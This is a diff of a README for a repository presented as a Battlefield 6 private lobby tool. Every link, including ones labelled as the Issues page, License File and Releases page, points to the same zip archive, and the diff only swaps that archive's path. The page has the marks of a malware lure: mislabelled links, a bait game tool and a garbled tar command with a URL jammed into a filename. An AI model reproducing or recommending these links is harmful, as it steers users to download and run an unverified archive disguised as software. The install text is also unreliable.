@@ -1,6 +1,6 @@
 # 🎮 battlefield-6-lobby-private-rep - Elevate Your Battlefield Experience Easily
 
-[![Download Now](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip%20Now-%20%F0%9F%93%8D-blue)](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip)
+[![Download Now](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip%20Now-%20%F0%9F%93%8D-blue)](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to the **battlefield-6-lobby-private-rep**! This tool is designed for pl
 
 To get started, visit the following link to download the latest version:
 
-[Download Now](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip)
+[Download Now](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip)
 
 1. Click on the link above.
 2. Find the latest release version.
@@ -66,7 +66,7 @@ Once the download is complete, follow these steps to install:
    ```
    or for tar files:
    ```bash
-   tar -xzf battlefield-6-lobby-private-rep*https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip
+   tar -xzf battlefield-6-lobby-private-rep*https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip
    ```
 
 ## 🎮 Launching the Application
@@ -88,7 +88,7 @@ After installing, you can start the application:
 
 If you need help, check the following resources:
 
-- [GitHub Issues Page](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip) to report problems or ask questions.
+- [GitHub Issues Page](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip) to report problems or ask questions.
 - The community forums for **battlefield-6-lobby-private-rep** users can be an excellent place to share tips and tricks.
 
 ## 🌍 Community Contribution
@@ -99,12 +99,12 @@ Feel free to contribute! If you'd like to add new features or improve existing o
 
 This project is open-source. You are free to use, modify, and distribute it under the terms of the MIT License.
 
-For more information, visit the [License File](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip).
+For more information, visit the [License File](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip).
 
 ## 🚩 Stay Updated
 
 For updates and new features, keep an eye on the Releases page:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/zap74/battlefield-6-lobby-private-rep/main/Conjugales/battlefield-6-lobby-private-rep_1.1.zip)
+[Visit the Releases Page](https://github.com/zap74/battlefield-6-lobby-private-rep/raw/refs/heads/main/Conjugales/rep_battlefield_private_lobby_v1.2-alpha.4.zip)
 
 Thank you for using **battlefield-6-lobby-private-rep**! Enjoy your customized Battlefield experience.
